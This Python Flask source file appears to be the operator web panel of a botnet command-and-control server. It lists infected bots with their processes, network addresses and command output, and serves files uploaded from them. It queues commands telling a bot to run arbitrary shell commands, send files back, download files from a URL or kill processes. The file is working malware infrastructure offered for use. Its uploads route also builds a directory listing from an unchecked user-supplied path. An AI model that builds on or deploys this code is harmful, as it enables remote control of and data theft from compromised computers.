import sqlite3 as sql
from flask import send_from_directory
from flask import g
from flask import request
from flask import render_template
from flask import redirect, url_for
from flask import session

from sqlweb import dbmain
from sqlweb import app
import os

DB_NAME = 'notmemory.sqlite'
IMG_FOLDER = 'img'


def get_db() -> sql.Connection:
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sql.connect(DB_NAME)
    return db


@app.route('/')
@app.route('/index')
@app.route('/home')
def index():
    conn = get_db()
    bot_count = dbmain.get_bot_count(conn)
    user_count = dbmain.get_user_count(conn)
    return render_template('index.html', bot_count=bot_count, user_count=user_count)

@app.route('/favicon.ico')
def favicon():
    return send_from_directory("static", 'favicon.ico', mimetype='image/png')

@app.route('/bots', methods=['GET'])
def bots():
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'GET':
        conn = get_db()
        return render_template('bots.html', bot_list = dbmain.get_all_bot_ids(conn))

@app.route('/bot/<id>', methods=['GET'])
def bot(id):
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'GET':
        conn = get_db()

        return render_template('bot.html', id = id, bot_data = dbmain.bot_tostringlist(conn, id))


@app.route('/bot/<id>/proclist', methods=['GET'])
def proclist(id):
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'GET':
        conn = get_db()
        return render_template('botproclist.html', id = id, bot_data = dbmain.bot_pstostring(conn, id))


@app.route('/bot/<id>/networkaddresses', methods=['GET'])
def networkaddresses(id):
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'GET':
        conn = get_db()
        return render_template('botnetworkaddresslist.html', id=id, bot_data=dbmain.bot_nwaddrtostring(conn, id))


@app.route('/bot/<id>/commandoutput', methods=['GET'])
def commandoutput(id):
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'GET':
        conn = get_db()
        return render_template('botcommandout.html', id=id, bot_data=dbmain.bot_cmdouttostring(conn, id))


@app.route('/uploads', methods=['GET'])
def uploads_main():
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'GET':
            abs_path = os.path.join(app.config['UPLOAD_FOLDER'])
            if not os.path.exists(abs_path):
                render_template('page_not_found.html'), 404
            if os.path.isfile(abs_path):
                return send_from_directory(app.config['UPLOAD_FOLDER'])
            files = os.listdir(abs_path)
            return render_template('uploads.html', files=files)

@app.route('/uploads/<path:req_path>', methods=['GET'])
def uploads(req_path):
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'GET':
            abs_path = os.path.join(app.config['UPLOAD_FOLDER'], req_path)
            if not os.path.exists(abs_path):
                render_template('page_not_found.html'), 404
            if os.path.isfile(abs_path):
                return send_from_directory(app.config['UPLOAD_FOLDER'], req_path)
                #return send_file(abs_path)
            # Show directory contents
            files = os.listdir(abs_path)
            return render_template('uploads.html', files=files)


@app.route('/action/run', methods=['POST'])
def actionrun():
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'POST':
        conn = get_db()
        dbmain.update_commandqueue(conn, request.form['id'], '4 ' + request.form['cmd'])
        return redirect(url_for('bot', id=request.form['id']))
    return 'Error adding command to database'

@app.route('/action/upload', methods=['POST'])
def actionupload():
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'POST':
        conn = get_db()
        dbmain.update_commandqueue(conn, request.form['id'], '5 ' + request.form['path'])
        return redirect(url_for('bot', id=request.form['id']))
    return 'Error adding command to database'

@app.route('/action/download', methods=['POST'])
def actiondownload():
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'POST':
        conn = get_db()
        dbmain.update_commandqueue(conn, request.form['id'], '6 ' + request.form['url'] + ' ' + request.form['filepath'])
        return redirect(url_for('bot', id=request.form['id']))
    return 'Error adding command to database'

@app.route('/action/kill', methods=['POST'])
def actionkill():
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'POST':
        conn = get_db()
        dbmain.update_commandqueue(conn, request.form['id'], '7 ' + request.form['pid'])
        return redirect(url_for('bot', id=request.form['id']))
    return 'Error adding command to database'

@app.route('/action/info', methods=['POST'])
def actioninfo():
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'POST':
        conn = get_db()
        dbmain.update_commandqueue(conn, request.form['id'], '2')
        return redirect(url_for('bot', id=request.form['id']))
    return 'Error adding command to database'

@app.route('/action/ps', methods=['POST'])
def actionps():
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'POST':
        conn = get_db()
        dbmain.update_commandqueue(conn, request.form['id'], '3')
        return redirect(url_for('bot', id=request.form['id']))
    return 'Error adding command to database'

@app.route('/action/clear', methods=['POST'])
def clearqueue():
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'POST':
        conn = get_db()
        dbmain.update_commandqueue(conn, request.form['id'], '')
        return redirect(url_for('bot', id=request.form['id']))
    return 'Error adding command to database'


@app.errorhandler(404)
def page_not_found(error):
    return render_template('page_not_found.html'), 404


@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()
